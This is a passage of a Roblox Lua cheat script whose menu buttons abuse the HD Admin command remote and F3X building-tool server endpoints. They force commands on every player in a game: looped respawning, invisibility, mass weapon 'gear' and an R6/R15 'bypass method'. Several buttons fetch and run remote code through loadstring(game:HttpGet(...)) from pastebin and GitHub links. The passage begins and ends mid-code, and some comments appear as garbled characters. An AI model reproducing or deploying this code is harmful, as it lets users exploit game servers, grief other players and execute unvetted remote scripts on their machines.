            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
                :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
        end
        wait(3.5)
    end
end)
    end    
})

Tab11:AddButton({
    Name = "unloop re all",
    Callback = function()
        _G.LoopRespawn = false
    end    
})

Tab11:AddButton({
    Name = "loop invisible all",
    Callback = function()
        _G.LoopInvisible = true -- Active le loop

spawn(function()
    while _G.LoopInvisible do
        for _, player in pairs(game.Players:GetPlayers()) do
            local args = { [1] = ";invisible " .. player.Name }
            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
                :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
        end
        wait(5)
    end
end)
    end    
})

Tab11:AddButton({
    Name = "unloop invisible all",
    Callback = function()
        _G.LoopInvisible = false
    end    
})

Tab11:AddButton({
    Name = "gear all Bombo's Survival Knife",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. " 121946387" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Luger Pistol",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "95354288" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Golden Super Fly Boombox",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "212641536" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Ronin Katana",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "12187348" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Ice Dragon Slayer",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "168141301" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Bloxy Cola",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "10472779" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Historic 'Timmy' Gun",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "116693764" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Teddy Bloxpin",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "12848902" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Rainbow Magic Carpet",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "225921000" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Gravity Coil",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "16688968" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Body Swap Potion",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "78730532" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Fuse Bomb",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "11563251" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Ban Hammer",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "10468797" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Red Hyperlaser Gun",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "212296936" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Bat Scythe",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "306971294" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Subspace Tripmine",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "11999247" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Attack Doge",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "257810065" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Rainbow Periastron Omega",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "159229806" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Godzilla Companion",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "3130875522" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Katana",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "11453385" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Torch",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "31839337" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Ultimate Drive Speedster",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "253519495" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Hyperlaser Gun",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "130113146" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all The Fiery Sun",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "83021250" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Moneybag",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "16722267" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Red Rolling Hoverboard",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "398675172" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all The General's .45",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "97885508" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Skeleton Scythe",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "95951330" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Sword of the Epicredness",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "409745306" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Kylo Ren’s Lightsaber",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "1208300505" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Scythe",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "28275809" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Flashbang",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "16979083" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Icy Arctic Fowl",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "101078559" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Trench Warfare Shotgun",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "94233344" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Noir Periastron Psi",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "120307951" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Teddy Trap",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "12890798" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Grapple Hook",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "30393548" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Azure Periastron Alpha",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "69499437" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Crimson Periastron Mu",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "99119240" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Dracovin Spell Book",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "49491736" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Ivory Periastron",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "108158379" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Spray Paint",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "80576967" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Dark Spellbook of the Forgotten",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "56561579" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Zombie Staff",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "26421972" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear all Phoenix",
    Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = ";gear " .. player.Name .. "92142799" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "gear me Bombo's Survival Knife",
    Callback = function()
        game.Players:Chat(";gear me 121946387")
    end    
})

Tab11:AddButton({
    Name = "gear me Luger Pistol",
    Callback = function()
        game.Players:Chat(";gear me 95354288")
    end    
})

Tab11:AddButton({
    Name = "gear me Golden Super Fly Boombox",
    Callback = function()
        game.Players:Chat(";gear me 212641536")
    end    
})

Tab11:AddButton({
    Name = "gear me Ronin Katana",
    Callback = function()
        game.Players:Chat(";gear me 12187348")
    end    
})

Tab11:AddButton({
    Name = "gear me Ice Dragon Slayer",
    Callback = function()
        game.Players:Chat(";gear me 168141301")
    end    
})

Tab11:AddButton({
    Name = "gear me Bloxy Cola",
    Callback = function()
        game.Players:Chat(";gear me 10472779")
    end    
})

Tab11:AddButton({
    Name = "gear me Historic 'Timmy' Gun",
    Callback = function()
        game.Players:Chat(";gear me 116693764")
    end    
})

Tab11:AddButton({
    Name = "gear me Teddy Bloxpin",
    Callback = function()
        game.Players:Chat(";gear me 12848902")
    end    
})

Tab11:AddButton({
    Name = "gear me Rainbow Magic Carpet",
    Callback = function()
        game.Players:Chat(";gear me 225921000")
    end    
})

Tab11:AddButton({
    Name = "gear me Body Swap Potion",
    Callback = function()
        game.Players:Chat(";gear me 78730532")
    end    
})

Tab11:AddButton({
    Name = "gear me Fuse Bomb",
    Callback = function()
        game.Players:Chat(";gear me 11563251")
    end    
})

Tab11:AddButton({
    Name = "gear me Ban Hammer",
    Callback = function()
        game.Players:Chat(";gear me 10468797")
    end    
})

Tab11:AddButton({
    Name = "gear me Red Hyperlaser Gun",
    Callback = function()
        game.Players:Chat(";gear me 212296936")
    end    
})

Tab11:AddButton({
    Name = "gear me Subspace Tripmine",
    Callback = function()
        game.Players:Chat(";gear me 11999247")
    end    
})

Tab11:AddButton({
    Name = "gear me Attack Doge",
    Callback = function()
        game.Players:Chat(";gear me 257810065")
    end    
})

Tab11:AddButton({
    Name = "gear me Rainbow Periastron Omega",
    Callback = function()
        game.Players:Chat(";gear me 159229806")
    end    
})

Tab11:AddButton({
    Name = "gear me Godzilla Companion",
    Callback = function()
        game.Players:Chat(";gear me 3130875522")
    end    
})

Tab11:AddButton({
    Name = "gear me Katana",
    Callback = function()
        game.Players:Chat(";gear me 11453385")
    end    
})

Tab11:AddButton({
    Name = "gear me Torch",
    Callback = function()
        game.Players:Chat(";gear me 31839337")
    end    
})

Tab11:AddButton({
    Name = "gear me Ultimate Drive Speedster",
    Callback = function()
        game.Players:Chat(";gear me 253519495")
    end    
})

Tab11:AddButton({
    Name = "gear me Hyperlaser Gun",
    Callback = function()
        game.Players:Chat(";gear me 130113146")
    end    
})

Tab11:AddButton({
    Name = "gear me The Fiery Sun",
    Callback = function()
        game.Players:Chat(";gear me 83021250")
    end    
})

Tab11:AddButton({
    Name = "gear me Moneybag",
    Callback = function()
        game.Players:Chat(";gear me 16722267")
    end    
})

Tab11:AddButton({
    Name = "gear me Cheezburger",
    Callback = function()
        game.Players:Chat(";gear me 16726030")
    end    
})

Tab11:AddButton({
    Name = "gear me The General's .45",
    Callback = function()
        game.Players:Chat(";gear me 97885508")
    end    
})

Tab11:AddButton({
    Name = "gear me Skeleton Scythe",
    Callback = function()
        game.Players:Chat(";gear me 95951330")
    end    
})

Tab11:AddButton({
    Name = "gear me Sword of the Epicredness",
    Callback = function()
        game.Players:Chat(";gear me 409745306")
    end    
})

Tab11:AddButton({
    Name = "gear me Kylo Ren’s Lightsaber",
    Callback = function()
        game.Players:Chat(";gear me 1208300505")
    end    
})

Tab11:AddButton({
    Name = "gear me Scythe",
    Callback = function()
        game.Players:Chat(";gear me 28275809")
    end    
})

Tab11:AddButton({
    Name = "gear me Flashbang",
    Callback = function()
        game.Players:Chat(";gear me 16979083")
    end    
})

Tab11:AddButton({
    Name = "gear me Trench Warfare Shotgun",
    Callback = function()
        game.Players:Chat(";gear me 94233344")
    end    
})

Tab11:AddButton({
    Name = "gear me Noir Periastron Psi",
    Callback = function()
        game.Players:Chat(";gear me 120307951")
    end    
})

Tab11:AddButton({
    Name = "gear me Grapple Hook",
    Callback = function()
        game.Players:Chat(";gear me 30393548")
    end    
})

Tab11:AddButton({
    Name = "gear me Azure Periastron Alpha",
    Callback = function()
        game.Players:Chat(";gear me 69499437")
    end    
})

Tab11:AddButton({
    Name = "gear me Crimson Periastron Mu",
    Callback = function()
        game.Players:Chat(";gear me 99119240")
    end    
})

Tab11:AddButton({
    Name = "gear me Dracovin Spell Book",
    Callback = function()
        game.Players:Chat(";gear me 49491736")
    end    
})

Tab11:AddButton({
    Name = "gear me Ivory Periastron",
    Callback = function()
        game.Players:Chat(";gear me 108158379")
    end    
})

Tab11:AddButton({
    Name = "gear me Dark Spellbook of the Forgotten",
    Callback = function()
        game.Players:Chat(";gear me 56561579")
    end    
})

Tab11:AddButton({
    Name = "gear me Zombie Staff",
    Callback = function()
        game.Players:Chat(";gear me 26421972")
    end    
})

Tab11:AddButton({
    Name = "gear me Pepperoni Pizza",
    Callback = function()
        game.Players:Chat(";gear me 22596452")
    end    
})

Tab11:AddButton({
    Name = "gear me Crescendo, The Soul Stealer",
    Callback = function()
        game.Players:Chat(";gear me 94794774")
    end    
})

Tab11:AddButton({
    Name = "gear me BB-8",
    Callback = function()
        game.Players:Chat(";gear me 1183007014")
    end    
})

Tab11:AddButton({
    Name = "gear me Snowball",
    Callback = function()
        game.Players:Chat(";gear me 19328185")
    end    
})

Tab11:AddButton({
    Name = "gear me Golden Steampunk Gloves",
    Callback = function()
        game.Players:Chat(";gear me ")
    end    
})

Tab11:AddButton({
    Name = "gear me Red Convertible",
    Callback = function()
        game.Players:Chat(";gear me 164207580")
    end    
})

Tab11:AddButton({
    Name = "gear me Deluxe Rainbow Magic Carpet",
    Callback = function()
        game.Players:Chat(";gear me 477910063")
    end    
})

Tab11:AddButton({
    Name = "gear me Sword of Darkness",
    Callback = function()
        game.Players:Chat(";gear me 77443491")
    end    
})

Tab11:AddButton({
    Name = "gear me R-80",
    Callback = function()
        game.Players:Chat(";gear me 12562495")
    end    
})

Tab11:AddButton({
    Name = "gear me Galactic Laser Gun",
    Callback = function()
        game.Players:Chat(";gear me 168143042")
    end    
})

Tab11:AddButton({
    Name = "R6 ME",
    Callback = function()
        game.Players:Chat(";r6 me")
    end    
})

Tab11:AddButton({
    Name = "R15 ME",
    Callback = function()
        game.Players:Chat(";r15 me")
    end    
})

Tab11:AddButton({
    Name = "mml admin Only Work if you have the permission",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/BD1Fre6s"))()
    end    
})

Tab11:AddButton({
    Name = "R6 all bypass method",
    Callback = function()
        local prefix = ";" -- Le préfixe de la commande HD Admin
local cmdName = "r6" -- Le nom de la commande pour changer en R6

-- Fonction pour envoyer la commande à tous les joueurs
for i, v in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix..cmdName.." all" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1) -- Attendre un peu entre chaque commande pour éviter de surcharger
end
    end    
})

Tab11:AddButton({
    Name = "R15 all bypass method",
    Callback = function()
        local prefix = ";" -- Le préfixe de la commande HD Admin
local cmdName = "r15" -- Le nom de la commande pour changer en R6

-- Fonction pour envoyer la commande à tous les joueurs
for i, v in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix..cmdName.." all" }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1) -- Attendre un peu entre chaque commande pour éviter de surcharger
end
    end    
})


local Tab12 = Window:MakeTab({
    Name = "F3x replication",
    Icon = "rbxassetid://11417471622",
    PremiumOnly = false
})

Tab12:AddButton({
    Name = "F3x Panel",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
    end    
})

Tab12:AddButton({
    Name = "Goner F3X",
    Callback = function()
        local function Script_F3X_Goner()
    local player = game.Players.LocalPlayer
    local char = player.Character
    local mouse = player:GetMouse()
    local RunService = game:GetService("RunService")
    
    local tool
    for i,v in player:GetDescendants() do if v.Name == "SyncAPI" then tool = v.Parent end end
    if not tool then
        for i,v in game.ReplicatedStorage:GetDescendants() do if v.Name == "SyncAPI" then tool = v.Parent end end
    end
    if not tool then return end
    
    local remote = tool.SyncAPI.ServerEndpoint
    local function _(args) remote:InvokeServer(unpack(args)) end

    local active = true
    local isAttacking = false
    local slashProgress = 0

    local function CreateGPart(size, color)
        local p = remote:InvokeServer("CreatePart", "Normal", char.HumanoidRootPart.CFrame, workspace)
        _({"SyncResize", {{["Part"] = p, ["CFrame"] = char.HumanoidRootPart.CFrame, ["Size"] = size}}})
        _({"SyncColor", {{["Part"] = p, ["Color"] = color or Color3.new(0, 0, 0)}}})
        _({"SyncMaterial", {{["Part"] = p, ["Material"] = Enum.Material.Neon}}})
        _({"SyncCollision", {{["Part"] = p, ["CanCollide"] = false}}})
        return p
    end

    -- Ð¢ÐµÐ»Ð¾
    local gTorso = CreateGPart(Vector3.new(2.2, 2.2, 1.2))
    local gHead = CreateGPart(Vector3.new(1, 1, 1)) 
    local gRArm = CreateGPart(Vector3.new(1.2, 2.2, 1.2))
    local gLArm = CreateGPart(Vector3.new(1.2, 2.2, 1.2))
    local gRLeg = CreateGPart(Vector3.new(1.2, 2.2, 1.2))
    local gLLeg = CreateGPart(Vector3.new(1.2, 2.2, 1.2))
    local gScythe = CreateGPart(Vector3.new(2, 5.925, 0.25))

    -- Ð“Ð»Ð°Ð·Ð°
    local eyeL = CreateGPart(Vector3.new(0.25, 0.25, 0.25), Color3.new(1, 0, 0))
    local eyeR = CreateGPart(Vector3.new(0.25, 0.25, 0.25), Color3.new(1, 0, 0))
    
    _({"CreateMeshes", {{["Part"] = eyeL}, {["Part"] = eyeR}, {["Part"] = gHead}, {["Part"] = gScythe}}})
    _({"SyncMesh", {
        {["Part"] = eyeL, ["MeshType"] = Enum.MeshType.Cylinder, ["Scale"] = Vector3.new(0.6, 0.6, 0.6)},
        {["Part"] = eyeR, ["MeshType"] = Enum.MeshType.Cylinder, ["Scale"] = Vector3.new(0.6, 0.6, 0.6)},
        {["Part"] = gHead, ["MeshType"] = Enum.MeshType.Head, ["Scale"] = Vector3.new(1.4, 1.4, 1.4)},
        {["Part"] = gScythe, ["MeshId"] = "rbxassetid://500489601", ["Scale"] = Vector3.new(0.01, 0.01, 0.01)}
    }})

    _({"CreateDecorations", {{["Part"] = gTorso, ["DecorationType"] = "Fire"}}})
    _({"SyncDecorate", {{["Part"] = gTorso, ["DecorationType"] = "Fire", ["Size"] = 10, ["Heat"] = 5, ["Color"] = Color3.new(0, 0, 0), ["SecondaryColor"] = Color3.new(0, 0, 0)}}})

    local tor = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
    local rArm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightHand")
    local rShoulder = tor:FindFirstChild("Right Shoulder") or rArm:FindFirstChild("RightShoulder")
    local oldC0 = rShoulder.C0

    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not active or not gTorso or not gTorso.Parent then 
            rShoulder.C0 = oldC0
            connection:Disconnect() 
            return 
        end

        local hitPos = mouse.Hit.p
        local jointPos = tor.CFrame:PointToWorldSpace(oldC0.p)
        local direction = (hitPos - jointPos).Unit
        local angle = math.asin(direction.Y)
        
        local slashAnim = CFrame.new()
        if isAttacking then
            slashProgress = slashProgress + 0.08
            local s = math.sin(slashProgress * math.pi)
            slashAnim = CFrame.Angles(math.rad(110 * s), math.rad(-80 * s), math.rad(25 * s))
            if slashProgress >= 1 then isAttacking = false slashProgress = 0 end
        end

        rShoulder.C0 = oldC0 * CFrame.Angles(0, 0, math.rad(90)) * CFrame.Angles(angle, 0, 0) * slashAnim

        local headCF = char.Head.CFrame
        local handCF = rArm.CFrame * CFrame.new(0, -1, 0) * CFrame.Angles(math.rad(90), 0, 0)
        local scytheCF = handCF * CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(90), math.rad(180), 0)

        task.spawn(function()
            _({"SyncMove", {
                {["Part"] = gTorso, ["CFrame"] = tor.CFrame},
